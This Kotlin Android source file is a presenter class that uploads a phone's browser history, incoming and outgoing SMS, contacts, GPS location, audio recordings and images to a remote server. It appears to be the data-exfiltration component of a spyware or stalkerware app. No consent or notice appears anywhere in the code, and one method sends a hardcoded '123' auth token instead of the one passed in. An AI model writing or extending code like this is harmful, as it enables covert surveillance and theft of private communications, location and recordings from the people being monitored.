package mvp.presenter

import api.ApiService
import base.BasePresenter
import com.arellomobile.mvp.InjectViewState
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import mvp.view.GlobarView
import zoomapps.mobileoko.App
import java.io.File
import javax.inject.Inject
import android.R.attr.data
import android.graphics.BitmapFactory
import android.media.Image
import android.util.Base64
import android.util.Log
import okhttp3.MediaType
import okhttp3.RequestBody
import okhttp3.MultipartBody
import java.io.ByteArrayInputStream
import java.io.InputStream
import android.graphics.Bitmap
import java.io.ByteArrayOutputStream


@InjectViewState
class GlobarPresenter : BasePresenter<GlobarView> {
    @Inject
    lateinit var apiService: ApiService
    var disposible: Disposable? = null

    constructor() {
        App.appComponent.inject(this)
    }

    fun uploadHistoryBrowser(auth_toke: String, content: String) {
        disposible = apiService.uploadHistoryBrowser(auth_toke, content).observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe({ apiResponse ->
                    viewState.responseUploadGlobar(apiResponse)
                }, { error ->
                    viewState.errorUploadGlobar(error.message.toString())
                })
        unsubscribe(disposible!!)
    }

    fun uploadSmsInbox(auth_token: String, sms: List<String>) {
        disposible = apiService.uploadSmsInbox(auth_token, sms).observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe({ apiResponse ->
                    viewState.responseUploadGlobar(apiResponse)
                }, { error ->
                    viewState.errorUploadGlobar(error.message.toString())
                })
        unsubscribe(disposible!!)


    }


    fun uploadSmsOutbox(auth_token: String, sms: List<String>){
        disposible = apiService.uploadSmsOutbox("123",sms ).observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe({apiResponse ->
                    viewState.responseUploadGlobar(apiResponse)
                }, { error->
                    viewState.errorUploadGlobar(error.message.toString())
                })
        unsubscribe(disposible!!)
    }

    fun uploadPhone(auth_token: String, phone: List<String>) {
        disposible = apiService.uploadPhone(auth_token, phone).observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe({ apiRespinse ->
                    viewState.responseUploadGlobar(apiRespinse)
                }, { error ->
                    viewState.errorUploadGlobar(error.message.toString())
                })
        unsubscribe(disposible!!)
    }

    fun uploadLocation(auth_token: String, latitude: Double, longitude: Double) {
        disposible = apiService.uploadLocation(auth_token, latitude, longitude).observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe({ apiResponse ->
                    viewState.responseUploadGlobar(apiResponse)
                }, { error ->
                    viewState.errorUploadGlobar(error.message.toString())
                })
        unsubscribe(disposible!!)

    }

    fun uploadRecorder(auth_token: String, pathFile: Array<File>) {
        val mutableList:MutableList<MultipartBody.Part> = mutableListOf()
        pathFile.forEach{v ->
            val audioBody = RequestBody.create(MediaType.parse("audio/*"), v)
            val aFile = MultipartBody.Part.createFormData("recorder", v.name, audioBody)
            mutableList.add(aFile)
        }

        disposible = apiService.uploadRecorder(auth_token, mutableList).observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe({ apiResponse ->
                    viewState.responseUploadGlobar(apiResponse)
                }, { error ->
                    viewState.errorUploadGlobar(error.message.toString())
                })
        unsubscribe(disposible!!)
    }


    fun uploadImages(auth_token: String, pathFile: Array<File>){
        val mutableList:MutableList<MultipartBody.Part> = mutableListOf()
        pathFile.forEach {v ->
            val imageBody = RequestBody.create(MediaType.parse("image/jpeg"), v)
            val imageFile = MultipartBody.Part.createFormData("images", v.name, imageBody)
            mutableList.add(imageFile)
        }
        disposible = apiService.uploadImages(auth_token, mutableList).observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe({ apiResponse ->
                    viewState.responseUploadGlobar(apiResponse)
                }, { error ->
                    viewState.errorUploadGlobar(error.message.toString())
                })
        //mutableList.clear()
        unsubscribe(disposible!!)
    }

}